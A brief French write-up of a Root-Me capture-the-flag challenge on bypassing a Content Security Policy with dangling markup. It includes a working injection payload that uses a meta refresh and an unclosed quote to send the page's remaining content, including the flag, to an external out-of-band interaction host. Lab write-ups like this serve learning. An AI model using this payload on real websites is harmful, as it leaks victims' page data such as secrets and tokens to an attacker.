Le challenge : https://www.root-me.org/fr/Challenges/Web-Client/CSP-Bypass-Dangling-markup


Tout d'abord regardons le csp 
On va remarquer qu'on peut quasiment faire aucune injection, base non prit en charge, img et fetch impossible etc 

Le but ici va essayer de contourner en faisant du danglign markup 
En d'autres termes 

Casser l'html pour mettre en place notre attaque

J'ai essayé ça 
‘‘‘
 "><meta http-equiv=refresh content='0;url=//d1dbg1rz1wg0000hhg90gosiabyyyyyyb.oast.pro/?q=<p>
‘‘‘

"> va casser la balise 
et on casse aussi avec un quote 
et hop on a le contenue de la page et le flag 



